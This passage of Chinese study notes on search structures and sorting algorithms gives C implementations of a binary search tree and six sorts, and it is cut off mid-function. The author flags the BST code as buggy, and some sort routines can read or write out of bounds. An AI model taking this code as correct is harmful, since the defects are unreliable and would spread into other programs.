</p><p>这个算法可以用于大型的增长相对来说有序的线性表</p></li><li><p>斐波那契查找</p><p>根据的还是折半查找，只不过这个的表是斐波那契数列</p></li><li><p>线性索引查找</p><ul><li><p>索引方式</p><ul><li><p>稠密索引</p><p>适用于数据量不大</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95.png"></p></li><li><p>分块索引</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95.png"></p></li><li><p>倒排索引</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95.png"></p></li></ul></li></ul></li></ol><h2 id="二叉排序树（二叉查找树）、"><a href="#二叉排序树（二叉查找树）、" class="headerlink" title="二叉排序树（二叉查找树）、"></a>二叉排序树（二叉查找树）、</h2><p>没有学会</p><p>下面代码有bug</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;math.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> size 9</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">pLeft</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">pRight</span>;</span><br>    <span class="hljs-type">int</span> value;<br>&#125; Node, *pNode;<br><br><span class="hljs-type">int</span> sub = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span> nums[size] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">insertNode</span><span class="hljs-params">(pNode *pRoot, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*pRoot == <span class="hljs-literal">NULL</span>) &#123;<br>        *pRoot = (pNode) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>        (*pRoot)-&gt;value = nums[sub];<br>        (*pRoot)-&gt;pLeft = <span class="hljs-literal">NULL</span>;<br>        (*pRoot)-&gt;pRight = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*pRoot)-&gt;value &gt; nums[sub]) &#123;<br>        insertNode(&amp;(*pRoot)-&gt;pLeft, val);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((*pRoot)-&gt;value &lt; nums[sub]) &#123;<br>        insertNode(&amp;(*pRoot)-&gt;pRight, val);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        sub++;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createTree</span><span class="hljs-params">(pNode *pRoot)</span> &#123;<br>    <span class="hljs-keyword">for</span> (; sub &lt; size; sub++) &#123;<br>        insertNode(pRoot, nums[sub]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">destroyTree</span><span class="hljs-params">(pNode *pRoot)</span> &#123;<br>    <span class="hljs-keyword">if</span> ((*pRoot)-&gt;pLeft != <span class="hljs-literal">NULL</span>) &#123;<br>        destroyTree(&amp;(*pRoot)-&gt;pLeft);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  %d  &quot;</span>, (*pRoot)-&gt;value);<br>    <span class="hljs-keyword">if</span> ((*pRoot)-&gt;pRight != <span class="hljs-literal">NULL</span>) &#123;<br>        destroyTree(&amp;(*pRoot)-&gt;pRight);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(*pRoot);<br>&#125;<br><br><span class="hljs-comment">//查找二叉树的元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">SearchBSF</span><span class="hljs-params">(pNode *root, pNode *value, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain:查找二叉树</span><br><span class="hljs-comment">     * return:value,如果存在，就返回此节点的地址，否则返回上一个节点的地址</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//如果发现了值，就直接返回</span><br>    <span class="hljs-keyword">if</span> ((*root)-&gt;value &gt;= val) &#123;<br>        *value = *root;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*root)-&gt;value == val) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*root)-&gt;pLeft != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">int</span> i = SearchBSF(&amp;(*root)-&gt;pLeft, value, val);<br>        <span class="hljs-comment">//如果不写if,可能会出现后面还没有遍历，前面就已经退出</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*root)-&gt;pRight != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">int</span> i = SearchBSF(&amp;(*root)-&gt;pRight, value, val);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//插入操作</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InsertBST</span><span class="hljs-params">(pNode *root, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain: 对二叉树排序树进行插入操作</span><br><span class="hljs-comment">     */</span><br>    pNode value = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (!SearchBSF(root, &amp;value, val)) &#123;<br>        pNode tem = (pNode) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>        <span class="hljs-keyword">if</span>(tem==<span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        tem-&gt;value = val;<br>        tem-&gt;pRight = <span class="hljs-literal">NULL</span>;<br>        tem-&gt;pLeft = <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-keyword">if</span> (value-&gt;value &gt; val) &#123;<br>            tem-&gt;pLeft = value-&gt;pLeft;<br>            value-&gt;pLeft = tem;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value-&gt;value &lt; val) &#123;<br>            tem-&gt;pRight=value-&gt;pRight;<br>            value-&gt;pRight=tem;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;insert error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(pNode* p)</span>&#123;<br>    pNode q,s;<br>    <span class="hljs-keyword">if</span>((*p)-&gt;pRight==<span class="hljs-literal">NULL</span>)&#123;<br>        q=*p;<br>        (*p)=(*p)-&gt;pRight;<br>        <span class="hljs-built_in">free</span>(q);<br>        q=<span class="hljs-literal">NULL</span>;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*p)-&gt;pLeft!=<span class="hljs-literal">NULL</span>)&#123;<br>        q=*p;<br>        (*p)=(*p)-&gt;pLeft;<br>        <span class="hljs-built_in">free</span>(q);<br>        q=<span class="hljs-literal">NULL</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        q=*p;<br>        s=q-&gt;pRight;<br>        <span class="hljs-keyword">while</span>(s!=<span class="hljs-literal">NULL</span>)&#123;<br>            q=s;<br>            s=s-&gt;pRight;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(q==*p)&#123;<br>            q=s;<br>            s=s-&gt;pLeft;<br>            (*p)-&gt;value=q-&gt;value;<br>            <span class="hljs-built_in">free</span>(q);<br>            q=<span class="hljs-literal">NULL</span>;<br>            (*p)-&gt;pLeft=s;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            (*p)-&gt;value=s-&gt;value;<br>            q-&gt;pRight=s-&gt;pLeft;<br>            <span class="hljs-built_in">free</span>(s);<br>            s=<span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-comment">//删除节点</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">deleteBST</span><span class="hljs-params">(pNode* root,<span class="hljs-type">int</span> val)</span>&#123;<br>    pNode tem;<br>    <span class="hljs-keyword">if</span>(*root==<span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t have tree&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span>(SearchBSF(root,&amp;tem,val))&#123;<br>            <span class="hljs-keyword">return</span> delete(&amp;tem);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    pNode root = <span class="hljs-literal">NULL</span>;<br>    pNode valueTem = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nums[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input value: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;value);<br>    createTree(&amp;root);<br>    <span class="hljs-keyword">if</span> (SearchBSF(&amp;root, &amp;valueTem, value)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hava value %d\n&quot;</span>, value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t hava value\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value node is:%d\n&quot;</span>, valueTem-&gt;value);<br>    InsertBST(&amp;root,value);<br>    <span class="hljs-keyword">if</span> (SearchBSF(&amp;root, &amp;valueTem, value)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hava value %d\n&quot;</span>, value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t hava value\n&quot;</span>);<br>    &#125;<br>    deleteBST(&amp;root,value);<br>    destroyTree(&amp;root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="平衡二叉排序树-AVL树"><a href="#平衡二叉排序树-AVL树" class="headerlink" title="平衡二叉排序树(AVL树)"></a>平衡二叉排序树(AVL树)</h2><ol><li><p>定义</p><p>左右子树的高度之差的绝对值小于等于1 </p><p>左右子树是一个平衡二叉排序树    </p></li><li><p>平衡因子</p><p>左右子树的高度差(左子树-右子树)</p><p><code>-1</code>,<code>1</code>,<code>0</code></p></li><li><p>调整平衡二叉树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E8%B0%83%E6%95%B4%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91.jpg"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/LL%E5%9E%8B.png"></p></li></ol><h2 id="散列表（hash）"><a href="#散列表（hash）" class="headerlink" title="散列表（hash）"></a>散列表（hash）</h2><ol><li><p>定义</p><p>记录储存位置，与关键字的之间的对应关系</p></li><li><p>散列方法</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E6%95%A3%E5%88%97%E6%96%B9%E6%B3%95.png"></p></li><li><p>冲突</p><p>不同的关键码通过散列方法映射到同一个位置  </p></li><li><p>同义词</p><p>具有相同地址的关键字</p></li><li><p>构造散列函数</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E7%9A%84%E6%9E%84%E9%80%A0.png"></p></li><li><p>处理冲突</p><ul><li><p>开放地址法</p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E5%BC%80%E6%94%BE%E5%9C%B0%E5%9D%80fa.png"></p></li><li><p>链地址法</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E9%93%BE%E5%9C%B0%E5%9D%80%E6%B3%95.png"></p></li></ul></li><li><p>散列表的查找</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E6%95%A3%E5%88%97%E8%A1%A8%E7%9A%84%E6%9F%A5%E6%89%BE%E6%96%B9%E6%B3%95.png"></p></li></ol><h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><ol><li><p>普通版</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; size-i; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(ints[j<span class="hljs-number">-1</span>]&lt;ints[j])&#123;<br>                <span class="hljs-type">int</span> tem=ints[j<span class="hljs-number">-1</span>];<br>                ints[j<span class="hljs-number">-1</span>]=ints[j];<br>                ints[j]=tem;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>根据需要限定范围</p></li></ol><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i+<span class="hljs-number">1</span>; j &lt; size; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(ints[i]&gt;ints[j])&#123;<br>                <span class="hljs-type">int</span> tem=ints[i];<br>                ints[i]=ints[j];<br>                ints[j]=tem;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h2><ol><li><p>对一个有序表插入一个数据</p></li><li><p>对一个无序的线表排序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (ints[i] &lt; ints[i - <span class="hljs-number">1</span>]) &#123;<br>            <span class="hljs-type">int</span> tem=ints[i];<br>            <span class="hljs-type">int</span> j=i<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">for</span> (; ints[j] &gt; tem; --j) &#123;<br>                ints[j+<span class="hljs-number">1</span>]=ints[j];<br>            &#125;<br>            ints[j+<span class="hljs-number">1</span>]=tem;<br>        &#125;<br>    &#125;<br>&#125;<br>   <br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><ol><li><p>只是对插排分组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> range=size;<br>    <span class="hljs-keyword">while</span>((range=range/<span class="hljs-number">3</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = range; i &lt; size; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (ints[i] &lt; ints[i - range]) &#123;<br>                <span class="hljs-type">int</span> tem=ints[i];<br>                <span class="hljs-type">int</span> j=i-range;<br>                <span class="hljs-keyword">for</span> (; ints[j] &gt; tem; j-=range) &#123;<br>                    ints[j+range]=ints[j];<br>                &#125;<br>                ints[j+range]=tem;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><ol><li><p>大根堆</p><p>根节点大于等于左右孩子的<code>value</code></p></li><li><p>小根堆</p><p>根节点小于等于左右孩子的<code>value</code></p></li><li><p>代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">void</span> <span class="hljs-title function_">HeapAdjust</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> tem = ints[s];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = s * <span class="hljs-number">2</span>; i &lt;= size; i *= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; size &amp;&amp; ints[i] &lt; ints[i + <span class="hljs-number">1</span>]) &#123;<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (tem &gt;= ints[i]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        ints[s] = ints[i];<br>        s = i;<br>    &#125;<br>    ints[s] = tem;<br>&#125;<br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = size / <span class="hljs-number">2</span>; i &gt; <span class="hljs-number">0</span>; --i) &#123;<br>        HeapAdjust(ints, i, size);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = size; i &gt; <span class="hljs-number">0</span>; --i) &#123;<br>        <span class="hljs-type">int</span> tem = ints[<span class="hljs-number">1</span>];<br>        ints[<span class="hljs-number">1</span>] = ints[i];<br>        ints[i] = tem;<br>        HeapAdjust(ints, <span class="hljs-number">1</span>, i - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><ol><li><p>有序表的合并</p><p>(线性表的合并)[<a href="https://tsy244.github.io/2023/03/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8/#%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%BA%94%E7%94%A8">线性表 - chg (tsy244.github.io)</a>]</p></li><li><p>递归 代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">merge</span><span class="hljs-params">(<span class="hljs-type">int</span> *list1, <span class="hljs-type">int</span> list1_size, <span class="hljs-type">int</span> *list2, <span class="hljs-type">int</span> list2_size)</span> &#123;<br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">20</span>] = &#123;<span class="hljs-number">-1</span>&#125;;<br>    <span class="hljs-type">int</span> list1Sub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> list2Sub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> intsSub = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (list1_size != list1Sub &amp;&amp; list2_size != list2Sub) &#123;<br>        ints[intsSub++] = list1[list1Sub] &gt; list2[list2Sub] ? list1[list1Sub++] : list2[list2Sub++];<br>    &#125;<br>    <span class="hljs-keyword">while</span> (list2Sub &lt; list2_size) &#123;<br>        ints[intsSub++] = list2[list2Sub++];<br>    &#125;<br>    <span class="hljs-keyword">while</span> (list1Sub &lt; list1_size) &#123;<br>        ints[intsSub++] = list1[list1Sub++];<br>    &#125;<br>   <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list1_size+list2_size; ++i) &#123;<br>        list1[i]=ints[i];<br>    &#125;<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">int</span> *list1 = ints;<br>        <span class="hljs-type">int</span> list1_size = size / <span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span> *list2 = ints + list1_size;<br>        <span class="hljs-type">int</span> list2_size = size - list1_size;<br>   <br>        sort(list1, list1_size);<br>        